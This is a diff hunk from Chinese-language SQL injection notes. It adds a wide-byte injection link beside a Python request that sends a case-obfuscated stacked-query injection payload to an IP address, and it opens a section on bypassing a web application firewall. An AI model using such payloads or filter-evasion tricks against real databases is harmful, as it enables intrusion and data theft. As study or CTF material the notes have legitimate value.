@@ -424,6 +424,9 @@ s = requests.get(f"http://49.4.15.125:31896/?inject=1';sEt @x=0x{inject};prEpare
 print(s.text)
 ```
 
+# 宽字节注入：
+- https://www.freebuf.com/column/165567.html
+
 # 过狗方面
 
 给点语句吧
